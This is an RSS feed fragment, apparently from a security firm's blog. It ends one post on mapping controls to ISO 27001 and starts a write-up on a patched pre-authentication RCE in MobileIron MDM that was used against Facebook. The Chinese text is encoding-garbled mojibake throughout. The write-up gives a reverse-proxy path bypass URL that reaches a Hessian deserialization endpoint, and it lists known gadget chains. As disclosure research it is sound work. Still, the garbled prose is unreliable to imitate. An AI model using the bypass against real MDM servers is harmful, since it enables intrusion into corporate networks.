&lt;p&gt;æœ€å¾Œï¼Œå¯ä»¥å°‡ä¸Šåœ–æ‰¾å‡º Procedure Layer çš„æ§åˆ¶é …ç›®ï¼Œå°æ‡‰åˆ° Process Layer çš„ç›¤é»çµæœï¼Œæª¢è¦–æµç¨‹ä¸Šå°æ‡‰çš„ä½œæ³•ã€‚ä»¥ ã€Œ14.1ã€ä¾æ“šæ•æ„Ÿæ€§ç¶²è·¯é€²è¡Œå€éš”ã€ç‚ºä¾‹ï¼Œå»è©•ä¼° ISO 27001 ä¸­ã€ŒA.6.2.2 é è·å·¥ä½œã€çš„è¦æ±‚ä¸Šï¼Œåœ¨è¨­å‚™ã€æ‡‰ç”¨ç¨‹å¼ã€ç¶²è·¯ã€è³‡æ–™åŠä½¿ç”¨è€…ï¼Œæ˜¯å¦éƒ½æœ‰åšå¥½ç¶²è·¯å€éš”ï¼›æˆ–æ˜¯ã€Œ6.3 é–‹å•Ÿæ›´è©³ç›¡çš„æ—¥èªŒã€ï¼Œè©•ä¼°åœ¨ ISO 27001 ä¸­ã€ŒA.16.1.5ã€å°æ–¼è³‡è¨Šå®‰å…¨äº‹æ•…çš„å›æ‡‰ä¸Šï¼Œåœ¨åµæ¸¬ã€å›æ‡‰è·Ÿå¾©åŸä¸Šï¼Œæ˜¯å¦éƒ½æœ‰å°æ‡‰çš„ç¨‹åºå¯ä»¥æ”¯æŒï¼Œç›£æ§åˆ°ç™¼å‡ºçš„å‘Šè­¦ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€éæœ¬ç¯‡çš„æ–¹æ³•è«–å¯ä»¥å¾æŠ€è¡“ã€ç¨‹åºã€æµç¨‹åˆ°é¢¨éšªï¼Œè®“ä¸åŒéšå±¤çš„è³‡å®‰å¾æ¥­äººå“¡æœ‰ä¸€è‡´æ€§çš„æºé€šæ–¹å¼ã€‚æˆ‘å€‘å¸Œæœ›è³‡å®‰ç­–ç•¥å°æ–¼ä¼æ¥­æ˜¯ä¸€å€‹çœŸæ­£å¯è¢«å¯¦ä½œã€å»ºç«‹å‡ºçŸ­ã€ä¸­ã€é•·æœŸç›®æ¨™çš„å‹™å¯¦ä½œç‚ºï¼Œè€Œéåªæ˜¯ä¸€å€‹çµ„ç¹”æ²»ç†ä¸­çš„ä¸€å€‹é«˜æ·±åè©ã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/</link>
                <guid>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards</guid>
                <pubDate>Tue, 13 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>çœ‹æˆ‘å¦‚ä½•å†ä¸€æ¬¡é§­é€² Facebookï¼Œä¸€å€‹åœ¨ MobileIron MDM ä¸Šçš„é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œæ¼æ´!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å—¨! å¥½ä¹…ä¸è¦‹ï¼Œé€™æ˜¯æˆ‘åœ¨ä»Šå¹´å¹´åˆçš„ç ”ç©¶ï¼Œè¬›è¿°å¦‚ä½•å°‹æ‰¾ä¸€æ¬¾çŸ¥åè¡Œå‹•è£ç½®ç®¡ç†ç”¢å“çš„æ¼æ´ï¼Œä¸¦ç¹éå±¤å±¤ä¿è­·å–å¾—é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œçš„æ•…äº‹! å…¶ä¸­çš„æ¼æ´ç¶“å›å ±å¾Œåœ¨å…­æœˆç”±å®˜æ–¹é‡‹å‡ºä¿®è£œç¨‹å¼ä¸¦ç·Šæ€¥é€šçŸ¥ä»–å€‘çš„å®¢æˆ¶ï¼Œè€Œæˆ‘å€‘ä¹Ÿåœ¨ä¿®è£œç¨‹å¼é‡‹å‡º 15 å¤©å¾Œç™¼ç¾ Facebook ä¸¦æœªåŠæ™‚æ›´æ–°ï¼Œå› æ­¤é€éæ¼æ´å–å¾—ä¼ºæœå™¨æ¬Šé™ä¸¦å›å ±çµ¦ Facebook!&lt;/p&gt;

&lt;p&gt;æ­¤ä»½ç ”ç©¶åŒæ™‚ç™¼è¡¨æ–¼ &lt;a href=&quot;https://hitcon.org/2020/&quot;&gt;HITCON 2020&lt;/a&gt;ï¼Œä½ å¯ä»¥å¾&lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;é€™è£¡&lt;/a&gt;å–å¾—é€™æ¬¡æ¼”è¬›çš„æŠ•å½±ç‰‡!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;èº«ç‚ºä¸€å€‹å°ˆæ¥­çš„ç´…éšŠï¼Œæˆ‘å€‘ä¸€ç›´åœ¨å°‹æ‰¾è‘—æ›´å¿«é€Ÿå¯ä»¥å¾å¤–éƒ¨é€²å…¥ä¼æ¥­å…§ç¶²çš„æœ€ä½³é€”å¾‘! å¦‚åŒæˆ‘å€‘å»å¹´åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; ç™¼è¡¨çš„ç ”ç©¶ï¼ŒSSL VPN ç†æ‰€ç•¶ç„¶æœƒæ”¾åœ¨å¤–éƒ¨ç¶²è·¯ï¼Œæˆç‚ºä¿è­·è‘—ç¶²è·¯å®‰å…¨ã€ä½¿å“¡å·¥é€²å…¥å…§éƒ¨ç¶²è·¯çš„åŸºç¤è¨­æ–½ï¼Œè€Œç•¶ä½ æ‰€ä¿¡ä»»ã€ä¸¦ä¸”ç”¨ä¾†ä¿è­·ä½ å®‰å…¨çš„è¨­å‚™ä¸å†å®‰å…¨äº†ï¼Œä½ è©²æ€éº¼è¾¦?&lt;/p&gt;

&lt;p&gt;ç”±æ­¤ç‚ºç™¼æƒ³ï¼Œæˆ‘å€‘é–‹å§‹å°‹æ‰¾è‘—æœ‰æ²’æœ‰æ–°çš„ä¼æ¥­ç¶²è·¯è„†å¼±é»å¯ç•¶æˆæˆ‘å€‘ç´…éšŠæ”»æ“Šæ»²é€ä¼æ¥­çš„åˆå§‹é€²å…¥é»ï¼Œåœ¨èª¿æŸ¥çš„éç¨‹ä¸­æˆ‘å€‘å° MDM/UEM é–‹å§‹ç”¢ç”Ÿäº†èˆˆè¶£ï¼Œè€Œé€™ç¯‡æ–‡ç« å°±æ˜¯å¾æ­¤ç™¼å±•å‡ºä¾†çš„ç ”ç©¶æˆæœ!&lt;/p&gt;

&lt;h2 id=&quot;ä»€éº¼æ˜¯-mdmuem-&quot;&gt;ä»€éº¼æ˜¯ MDM/UEM ?&lt;/h2&gt;

&lt;p&gt;Mobile Device Managementï¼Œç°¡ç¨± MDMï¼Œç´„æ˜¯åœ¨ 2012 å¹´é–“ï¼Œå€‹äººæ‰‹æ©Ÿã€å¹³æ¿è£ç½®é–‹å§‹èˆˆèµ·æ™‚ï¼Œç‚ºäº†ä½¿ä¼æ¥­æ›´å¥½çš„ç®¡ç†å“¡å·¥çš„ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD è£ç½®&lt;/a&gt;ï¼Œæ‡‰é‹è€Œç”Ÿçš„è³‡ç”¢ç›¤é»ç³»çµ±ï¼Œä¼æ¥­å¯ä»¥é€é MDM ç”¢å“ï¼Œç®¡ç†å“¡å·¥çš„è¡Œå‹•è£ç½®ï¼Œç¢ºä¿è£ç½®åªåœ¨ä¿¡ä»»çš„ç’°å¢ƒã€æ”¿ç­–ä¸‹é‹è¡Œï¼Œä¹Ÿå¯ä»¥å¾ä¸­å¿ƒçš„ç«¯é»ä¼ºæœå™¨ï¼Œé‡å°æ‰€æ§åˆ¶çš„æ‰‹æ©Ÿï¼Œéƒ¨ç½²æ‡‰ç”¨ç¨‹å¼ã€å®‰è£æ†‘è­‰ç”šè‡³é ç«¯æ“æ§ä»¥ç®¡ç†ä¼æ¥­è³‡ç”¢ï¼Œæ›´å¯ä»¥åœ¨è£ç½®éºå¤±æ™‚ï¼Œé€é MDM é ç«¯ä¸Šé–ï¼Œæˆ–æ˜¯æŠ¹é™¤æ•´å°è£ç½®è³‡æ–™é”åˆ°ä¼æ¥­éš±ç§ä¸å¤–æ¼çš„ç›®çš„!&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) å‰‡ç‚ºè¿‘å¹¾å¹´ä¾†æ›´æ–°çš„ä¸€å€‹è¡“èªï¼Œå…¶æ ¸å¿ƒçš†ç‚ºè¡Œå‹•è£ç½®çš„ç®¡ç†ï¼Œåªæ˜¯ UEM ä¸€è©åŒ…å«æ›´å»£çš„è£ç½®å®šç¾©! æˆ‘å€‘ä»¥ä¸‹çš†ç”¨ MDM ä¸€è©ä¾†ä»£æŒ‡åŒé¡ç”¢å“ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æˆ‘å€‘çš„ç›®æ¨™&quot;&gt;æˆ‘å€‘çš„ç›®æ¨™&lt;/h2&gt;

&lt;p&gt;MDM ä½œç‚ºä¸€å€‹ä¸­å¿ƒåŒ–çš„ç«¯é»æ§åˆ¶ç³»çµ±ï¼Œå¯ä»¥æ§åˆ¶ã€ä¸¦ç®¡ç†æ——ä¸‹æ‰€æœ‰å“¡å·¥å€‹äººè£ç½®! å°æ—¥ç›Šå£¯å¤§çš„ä¼æ¥­ä¾†èªªï¼Œçµ•å°æ˜¯ä¸€å€‹æœ€ä½³çš„è³‡ç”¢ç›¤é»ç”¢å“ï¼Œç›¸å°çš„ï¼Œå°é§­å®¢ä¾†èªªä¹Ÿæ˜¯! è€Œç‚ºäº†ç®¡ç†ä¾†è‡ªä¸–ç•Œå„åœ°çš„å“¡å·¥è£ç½®é€£ç·šï¼ŒMDM åˆå‹¢å¿…å¾—æ›éœ²åœ¨å¤–ç¶²ã€‚ ä¸€å€‹å¯ä»¥ã€Œç®¡ç†å“¡å·¥è£ç½®ã€åˆã€Œæ”¾ç½®åœ¨å¤–ç¶²ã€çš„è¨­å‚™ï¼Œé€™å°æˆ‘å€‘çš„ç´…éšŠæ¼”ç·´ä¾†èªªç„¡ç–‘æ˜¯æœ€æ£’çš„æ»²é€ç®¡é“!&lt;/p&gt;

&lt;p&gt;å¦å¤–ï¼Œå¾é€™å¹¾å¹´çš„å®‰å…¨è¶¨å‹¢ä¹Ÿä¸é›£ç™¼ç¾ MDM é€æ¼¸æˆç‚ºé§­å®¢ã€APT çµ„ç¹”çš„é¦–é¸ç›®æ¨™! èª˜ä½¿å—å®³è€…åŒæ„æƒ¡æ„çš„ MDM æˆç‚ºä½ è£ç½®çš„ C&amp;amp;C ä¼ºæœå™¨ï¼Œæˆ–æ˜¯ä¹¾è„†å…¥ä¾µä¼æ¥­æ”¾ç½®åœ¨å¤–ç¶²çš„ MDM è¨­å‚™ï¼Œåœ¨æ‰¹æ¬¡åœ°æ´¾é€è¡Œå‹•è£ç½®æœ¨é¦¬æ„ŸæŸ“æ‰€æœ‰ä¼æ¥­å“¡å·¥æ‰‹æ©Ÿã€é›»è…¦ï¼Œä»¥é”åˆ°é€²ä¸€æ­¥çš„æ”»æ“Š! é€™äº›éƒ½å·²æˆçœŸï¼Œè©³ç´°çš„å ±å‘Šå¯åƒé–± Cisco Talos åœ˜éšŠæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Letâ€™s Hide This App&lt;/a&gt; ä»¥åŠ CheckPoint CPR åœ˜éšŠæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;å¾å‰é¢çš„å¹¾å€‹æ¡ˆä¾‹æˆ‘å€‘å¾—çŸ¥ MDM å°æ–¼ä¼æ¥­å®‰å…¨ä¾†èªªï¼Œæ˜¯ä¸€å€‹å¾ˆå¥½çš„åˆ‡å…¥é»ï¼Œå› æ­¤æˆ‘å€‘é–‹å§‹ç ”ç©¶ç›¸é—œçš„æ”»æ“Šé¢! è€Œå¸‚é¢ä¸Š MDM å» å•†æœ‰éå¸¸å¤šï¼Œå„å€‹å¤§å» å¦‚ Microsoftã€IBM ç”šè‡³ Apple éƒ½æœ‰æ¨å‡ºè‡ªå·±çš„ MDM ç”¢å“ï¼Œæˆ‘å€‘è¦æŒ‘é¸å“ªå€‹é–‹å§‹æˆç‚ºæˆ‘å€‘çš„ç ”ç©¶å°è±¡å‘¢?&lt;/p&gt;

&lt;p&gt;å› æ­¤æˆ‘å€‘é€éå…¬é–‹æƒ…å ±åˆ—èˆ‰äº†å¸‚é¢ä¸Šå¸¸è¦‹çš„ MDM ç”¢å“ï¼Œä¸¦é…åˆå„å®¶ç‰¹å¾µå°å…¨ä¸–ç•Œé€²è¡Œäº†ä¸€æ¬¡æƒæï¼Œç™¼ç¾æœ€å¤šä¼æ¥­ä½¿ç”¨çš„ MDM ç‚º VMware AirWatch èˆ‡ MobileIron é€™å…©å¥—ç”¢å“! è‡³æ–¼è¦æŒ‘å“ªä¸€å®¶ç ”ç©¶å‘¢? æˆ‘å€‘é¸æ“‡äº†å¾Œè€…ï¼Œé™¤äº†è€ƒé‡åˆ°å¤§éƒ¨åˆ†çš„å®¢æˆ¶éƒ½æ˜¯ä½¿ç”¨ MobileIron å¤–ï¼Œå¦å¤–ä¸€å€‹å¸å¼•æˆ‘çš„é»å‰‡æ˜¯ Facebook ä¹Ÿæ˜¯ä»–å€‘çš„å®¢æˆ¶! å¾æˆ‘å€‘åœ¨ 2016 å¹´ç™¼è¡¨çš„ &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt; ç ”ç©¶ä¸­ï¼Œå°±å·²ç™¼ç¾ Facebook ä½¿ç”¨ MobileIron ä½œç‚ºä»–å€‘çš„ MDM è§£æ±ºæ–¹æ¡ˆ!&lt;/p&gt;

&lt;p&gt;æ ¹æ“š MobileIron å®˜æ–¹ç¶²ç«™æè¿°ï¼Œè‡³å°‘æœ‰ 20000+ çš„ä¼æ¥­ä½¿ç”¨ MobileIron ç•¶æˆä»–å€‘çš„ MDM è§£æ±ºæ–¹æ¡ˆï¼Œè€Œæ ¹æ“šæˆ‘å€‘å¯¦éš›å°å…¨ä¸–ç•Œçš„æƒæï¼Œä¹Ÿè‡³å°‘æœ‰ 15% ä»¥ä¸Šçš„è²¡å¯Œä¸–ç•Œ 500 å¤§ä¼æ¥­ä½¿ç”¨ MobileIron ä¸”&lt;strong&gt;æ›éœ²åœ¨å¤–ç¶²&lt;/strong&gt;(å¯¦éš›ä¸Šä¸€å®šæ›´å¤š)ï¼Œå› æ­¤ï¼Œå°‹æ‰¾ MobileIron çš„æ¼æ´ä¹Ÿå°±è®Šæˆæˆ‘å€‘çš„é¦–è¦ç›®æ¨™!&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•é–‹å§‹ç ”ç©¶&quot;&gt;å¦‚ä½•é–‹å§‹ç ”ç©¶&lt;/h2&gt;

&lt;p&gt;å¾&lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;éå¾€å‡ºç¾éçš„æ¼æ´&lt;/a&gt;å¯ä»¥å¾—çŸ¥ MobileIron ä¸¦æ²’æœ‰å—åˆ°å¤ªå¤šå®‰å…¨äººå“¡ç ”ç©¶ï¼Œå…¶ä¸­åŸå› é™¤äº† MDM é€™å€‹æ”»æ“Šå‘é‡å°šæœªå»£ç‚ºäººçŸ¥å¤–ï¼Œå¦ä¸€å€‹å¯èƒ½æ˜¯å› ç‚ºé—œæ–¼ MobileIron çš„ç›¸é—œéŸŒé«”å¤ªé›£å–å¾—ï¼Œç ”ç©¶ä¸€æ¬¾è¨­å‚™æœ€å¤§çš„å•é¡Œæ˜¯å¦‚ä½•å¾ç´”ç²¹çš„é»‘ç®±ï¼Œåˆ°å¯ä»¥åˆ†æçš„ç°ç®±ã€ç”šè‡³ç™½ç®±! ç”±æ–¼ç„¡æ³•å¾å®˜ç¶²ä¸‹è¼‰éŸŒé«”ï¼Œæˆ‘å€‘èŠ±è²»äº†å¥½å¹¾å¤©å˜—è©¦è‘—å„ç¨®é—œéµå­—åœ¨ç¶²è·¯ä¸Šå°‹æ‰¾å¯åˆ©ç”¨çš„å…¬é–‹è³‡è¨Šï¼Œæœ€å¾Œæ‰åœ¨ Goolge Search ç´¢å¼•åˆ°çš„å…¶ä¸­ä¸€å€‹å…¬é–‹ç¶²ç«™æ ¹ç›®éŒ„ä¸Šç™¼ç¾ç–‘ä¼¼æ˜¯é–‹ç™¼å•†æ¸¬è©¦ç”¨çš„ RPM åŒ…ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸‹è¼‰å›çš„éŸŒé«”ç‚º 2018 å¹´åˆçš„ç‰ˆæœ¬ï¼Œé›¢ç¾åœ¨ä¹Ÿæœ‰å¾ˆé•·ä¸€æ®µæ™‚é–“ï¼Œä¹Ÿè¨±æ ¸å¿ƒç¨‹å¼ç¢¼ä¹Ÿå¤§æ”¹éï¼Œä¸éç¸½æ¯”ä»€éº¼éƒ½æ²’æœ‰å¥½ï¼Œå› æ­¤æˆ‘å€‘å°±å¾é€™ä»½æª”æ¡ˆé–‹å§‹ç ”ç©¶èµ·ã€‚&lt;/p&gt;

&lt;p&gt;&lt;em&gt;å‚™è¨»: ç¶“é€šçŸ¥ MobileIron å®˜æ–¹å¾Œï¼Œæ­¤é–‹ç™¼å•†ç¶²ç«™å·²é—œé–‰ã€‚&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•å°‹æ‰¾æ¼æ´&quot;&gt;å¦‚ä½•å°‹æ‰¾æ¼æ´&lt;/h2&gt;

&lt;p&gt;æ•´å€‹ MobileIron ä½¿ç”¨ Java ä½œç‚ºä¸»è¦é–‹ç™¼èªè¨€ï¼Œå°å¤–é–‹æ”¾çš„é€£æ¥åŸ ç‚º 443, 8443, 9997ï¼Œå„å€‹é€£æ¥åŸ å°æ‡‰åŠŸèƒ½å¦‚ä¸‹:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;443 ç‚ºä½¿ç”¨è€…è£ç½®è¨»å†Šä»‹é¢&lt;/li&gt;
  &lt;li&gt;8443 ç‚ºè¨­å‚™ç®¡ç†ä»‹é¢&lt;/li&gt;
  &lt;li&gt;9997 ç‚ºä¸€å€‹ MobileIron ç§æœ‰çš„è£ç½®åŒæ­¥å”å®š (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸‰å€‹é€£æ¥åŸ çš†é€é TLS ä¿è­·é€£ç·šçš„å®‰å…¨æ€§åŠå®Œæ•´æ€§ï¼Œç¶²é éƒ¨åˆ†å‰‡æ˜¯é€é Apache çš„ Reverse Proxy æ¶æ§‹å°‡é€£ç·šå°è‡³å¾Œæ–¹ï¼Œç”± Tomcat éƒ¨ç½²çš„ç¶²é æ‡‰ç”¨è™•ç†ï¼Œç¶²é æ‡‰ç”¨å‰‡ç”± Spring MVC é–‹ç™¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ä½¿ç”¨çš„æŠ€è¡“æ¶æ§‹ç›¸å°æ–°ï¼Œå‚³çµ±é¡å‹çš„æ¼æ´å¦‚ SQL Injection ä¹Ÿè¼ƒé›£å¾å–®ä¸€çš„é»ä¾†ç™¼ç¾ï¼Œå› æ­¤ç†è§£ç¨‹å¼é‚è¼¯ä¸¦é…åˆæ¶æ§‹å±¤é¢çš„æ”»æ“Šå°±è®Šæˆæˆ‘å€‘é€™æ¬¡å°‹æ‰¾æ¼æ´çš„ä¸»è¦ç›®æ¨™!&lt;/p&gt;

&lt;p&gt;é€™æ¬¡çš„æ¼æ´ä¹Ÿå¾ˆç°¡å–®ï¼Œä¸»è¦æ˜¯ Web Service ä½¿ç”¨äº† Hessian æ ¼å¼è™•ç†è³‡æ–™é€²è€Œç”¢ç”Ÿäº†ååºåˆ—åŒ–çš„å¼±é»! é›–ç„¶æ¼æ´ä¸€å¥è©±å°±å¯ä»¥è§£é‡‹å®Œäº†ï¼Œä½†æ‡‚çš„äººæ‰çŸ¥é“ååºåˆ—åŒ–ä¸¦ä¸ä»£è¡¨ä½ å¯ä»¥åšä»»ä½•äº‹ï¼Œæ¥ä¸‹ä¾†çš„åˆ©ç”¨æ‰æ˜¯ç²¾å½©çš„åœ°æ–¹!&lt;/p&gt;

&lt;p&gt;ç¾åœ¨å·²çŸ¥ MobileIron åœ¨è™•ç† Web Service çš„åœ°æ–¹å­˜åœ¨ Hessian ååºåˆ—åŒ–æ¼æ´! ä½†æ¼æ´å­˜åœ¨ï¼Œä¸¦ä¸ä»£è¡¨æˆ‘å€‘ç¢°å¾—åˆ°æ¼æ´ï¼Œå¯ä»¥è§¸ç™¼ Hessian ååºåˆ—åŒ–çš„è·¯å¾‘åˆ†åˆ¥åœ¨:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;ç®¡ç†ä»‹é¢ - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mifs/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç®¡ç†ä»‹é¢åŸºæœ¬ä¸Šæ²’æœ‰ä»»ä½•é˜»æ“‹ï¼Œå¯ä»¥è¼•é¬†çš„ç¢°åˆ° Web Serviceï¼Œè€Œä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢çš„ Web Service å‰‡ç„¡æ³•å­˜å–ï¼Œé€™å°æˆ‘å€‘ä¾†èªªæ˜¯ä¸€å€‹è‡´å‘½æ€§çš„æ‰“æ“Šï¼Œç”±æ–¼å¤§éƒ¨åˆ†ä¼æ¥­çš„ç¶²è·¯æ¶æ§‹ä¸¦ä¸æœƒå°‡ç®¡ç†ä»‹é¢çš„é€£æ¥åŸ é–‹æ”¾åœ¨å¤–éƒ¨ç¶²è·¯ï¼Œå› æ­¤åªèƒ½æ”»æ“Šç®¡ç†ä»‹é¢å°æ–¼çš„åˆ©ç”¨ç¨‹åº¦ä¸¦ä¸å¤§ï¼Œå› æ­¤æˆ‘å€‘å¿…é ˆå°‹æ‰¾å…¶ä»–çš„æ–¹å¼å»è§¸ç™¼é€™å€‹æ¼æ´!&lt;/p&gt;

&lt;p&gt;ä»”ç´°è§€å¯Ÿ MobileIron çš„é˜»æ“‹æ–¹å¼ï¼Œç™¼ç¾å®ƒæ˜¯é€éåœ¨ Apache ä¸Šä½¿ç”¨ Rewrite Rules å»é˜»æ“‹å°ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ Web Service çš„å­˜å–:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å—¯ï¼Œå¾ˆæ£’! ä½¿ç”¨ Reverse Proxy æ¶æ§‹è€Œä¸”æ˜¯åœ¨å‰é¢é‚£å±¤åšé˜»æ“‹ï¼Œä½ æ˜¯å¦æƒ³åˆ°ä»€éº¼å‘¢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æ²’éŒ¯! å°±æ˜¯æˆ‘å€‘åœ¨ &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;2015 å¹´&lt;/a&gt;ç™¼ç¾ï¼Œä¸¦ä¸”åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt; ä¸Šæ‰€ç™¼è¡¨çš„é‡å° Reverse Proxy æ¶æ§‹çš„æ–°æ”»æ“Šé¢ &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! é€™å€‹å„ªç§€çš„æŠ€å·§æœ€è¿‘ä¹Ÿè¢«å¾ˆå¥½çš„åˆ©ç”¨åœ¨ &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;CVE-2020-5902&lt;/a&gt;ï¼ŒF5 BIG-IP TMUI çš„é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œä¸Š!&lt;/p&gt;

&lt;p&gt;é€é Apache èˆ‡ Tomcat å°è·¯å¾‘ç†è§£çš„ä¸ä¸€è‡´ï¼Œæˆ‘å€‘å¯ä»¥é€éä»¥ä¸‹æ–¹å¼ç¹é Rewrite Rule å†ä¸€æ¬¡æ”»æ“Š Web Service!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç¢°! å› æ­¤ç¾åœ¨ä¸ç®¡æ˜¯ 8443 çš„ç®¡ç†ä»‹é¢é‚„æ˜¯ 443 çš„ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ï¼Œæˆ‘å€‘éƒ½å¯ä»¥ç¢°åˆ°æœ‰ Hessian ååºåˆ—åŒ–å­˜åœ¨çš„ Web Service äº†!&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åˆ©ç”¨æ¼æ´&quot;&gt;å¦‚ä½•åˆ©ç”¨æ¼æ´&lt;/h2&gt;

&lt;p&gt;ç¾åœ¨è®“æˆ‘å€‘å›åˆ° Hessian ååºåˆ—åŒ–çš„åˆ©ç”¨ä¸Š! é‡å° Hessian ååºåˆ—åŒ–ï¼Œ&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; å·²ç¶“åœ¨ä»–çš„ &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; ä¸­åšäº†ä¸€å€‹å¾ˆè©³ç´°çš„ç ”ç©¶å ±å‘Š! å¾ä»–æ‰€é–‹æºçš„ &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; åŸå§‹ç¢¼ä¸­ï¼Œæˆ‘å€‘ä¹Ÿå­¸ç¿’åˆ° Hessian åœ¨ååºåˆ—åŒ–éç¨‹ä¸­é™¤äº†é€é HashMap è§¸ç™¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; ç­‰è§¸ç™¼é»å¤–ï¼Œä¹Ÿå¯é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt; ä¸²å‡º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt;ï¼Œè€Œç›®å‰é—œæ–¼ Hessian ååºåˆ—åŒ–å·²å­˜åœ¨çš„åˆ©ç”¨éˆæœ‰å››æ¢:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

